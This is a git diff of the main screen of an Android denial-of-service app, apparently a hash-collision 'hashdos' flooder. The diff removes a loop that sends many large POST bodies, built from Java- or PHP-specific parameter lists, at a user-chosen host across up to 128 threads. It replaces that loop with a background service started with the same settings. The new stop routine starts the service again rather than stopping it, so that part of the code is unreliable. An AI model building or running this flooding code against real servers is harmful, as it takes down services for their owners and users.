@@ -1,5 +1,6 @@
 package net.openfiresecurity.ofsdoser.fragments;
 
+import android.content.Intent;
 import android.os.Bundle;
 import android.support.v4.app.Fragment;
 import android.view.LayoutInflater;
@@ -15,31 +16,20 @@ import android.widget.Toast;
 import android.widget.ToggleButton;
 
 import net.openfiresecurity.ofsdoser.R;
-import net.openfiresecurity.ofsdoser.util.Lists;
-import net.openfiresecurity.ofsdoser.util.ThreadInject;
-
-import java.util.List;
+import net.openfiresecurity.ofsdoser.services.DosService;
 
 /**
  * Created by alex on 13.11.13.
  */
-public class DosFragment extends Fragment implements Runnable, SeekBar.OnSeekBarChangeListener {
+public class DosFragment extends Fragment implements SeekBar.OnSeekBarChangeListener {
 
-    private int[] states = new int[200];
-    private volatile Thread t;
     private RadioButton rbJava;
     private ToggleButton tb;
     private ProgressBar cpb;
     private EditText etTarget;
     private SeekBar sbThreads, sbPacketSize;
-    private boolean shouldRun = false;
     private TextView tvPacketSize, tvThreads;
     private Toast mToast;
-
-    @Override
-    public void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-    }
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
@@ -53,16 +43,14 @@ public class DosFragment extends Fragment implements Runnable, SeekBar.OnSeekBar
                     if (arg1) {
                         makeToast("DoS Initiated!");
                         cpb.setVisibility(View.VISIBLE);
-                        shouldRun = true;
                         startThread();
                     } else {
                         makeToast("DoS Stopped!");
                         cpb.setVisibility(View.INVISIBLE);
-                        shouldRun = false;
                         stopThread();
                     }
                 } else {
-                    makeToast("Please recheck your Settings again.\nCouldnt start the DoS.");
+                    makeToast("Please recheck your Settings again.\nCouldn't start the DoS.");
                     tb.setChecked(false);
                 }
             }
@@ -86,8 +74,8 @@ public class DosFragment extends Fragment implements Runnable, SeekBar.OnSeekBar
         etTarget = (EditText) v.findViewById(R.id.etHashdosTarget);
         sbPacketSize = (SeekBar) v.findViewById(R.id.sbHashPacketSize);
         sbThreads = (SeekBar) v.findViewById(R.id.sbHashThreads);
-        sbPacketSize.setMax(10240);
-        sbThreads.setMax(128);
+        sbPacketSize.setMax(10240 - 1);
+        sbThreads.setMax(128 - 1);
         sbPacketSize.setProgress(100);
         sbThreads.setProgress(1);
         tvPacketSize.setText("100");
@@ -99,89 +87,17 @@ public class DosFragment extends Fragment implements Runnable, SeekBar.OnSeekBar
         return v;
     }
 
-    @Override
-    public void run() {
-        while (shouldRun) {
-            int threads = sbThreads.getProgress() + 1;
-            int packetsize = sbPacketSize.getProgress() + 1;
-
-            String url = "http://" + etTarget.getText().toString() + "/";
-            ThreadInject[] t = new ThreadInject[threads];
-            List<String> list;
-            if (rbJava.isChecked()) {
-                list = Lists.javaList;
-            } else {
-                list = Lists.phpList;
-            }
-            do {
-                for (int i = 0; i < t.length; i++) {
-                    t[i] = new ThreadInject(url, getPost(list,
-                            packetsize * 1024));
-                }
-                for (ThreadInject aT : t) {
-                    aT.start();
-                }
-                boolean stop;
-                do {
-                    for (int i = 0; i < t.length; i++) {
-                        set(i, t[i].getLocalState());
-                    }
-
-                    try {
-                        Thread.sleep(300L);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    stop = true;
-                    for (int i = 0; i < t.length; i++) {
-                        if (states[i] < 6) {
-                            stop = false;
-                            break;
-
-                        }
-                    }
-                } while (!stop);
-            } while (shouldRun);
-        }
-        stopThread();
+    private void startThread() {
+        Intent i = new Intent(getActivity(), DosService.class);
+        i.putExtra(DosService.BUNDLE_THREADS, sbThreads.getProgress() + 1);
+        i.putExtra(DosService.BUNDLE_PACKETSIZE, sbPacketSize.getProgress() + 1);
+        i.putExtra(DosService.BUNDLE_JAVA, rbJava.isChecked());
+        i.putExtra(DosService.BUNDLE_HOST, etTarget.getText().toString());
+        getActivity().startService(i);
     }
 
-    public synchronized void startThread() {
-        if (t == null) {
-            t = new Thread(this);
-            assert t != null;
-            t.start();
-        }
-    }
-
-    public synchronized void stopThread() {
-        if (t != null) {
-            Thread stopper = t;
-            t.interrupt();
-            t = null;
-            assert stopper != null;
-            stopper.interrupt();
-        }
-    }
-
-    public String getPost(List<String> completeList, int maxSize) {
-        StringBuilder bu = new StringBuilder(maxSize);
-        int reqSize = 0;
-        for (String value : completeList) {
-            reqSize += value.length() + 4;
-            if (reqSize > (maxSize - 40)) {
-                break;
-            }
-            bu.append("&");
-            bu.append(value);
-            bu.append("=a");
-        }
-
-        return bu.toString();
-    }
-
-    private void set(int i, int localState) {
-        states[i] = localState;
+    private void stopThread() {
+        getActivity().startService(new Intent(getActivity(), DosService.class));
     }
 
     private void makeToast(String msg) {
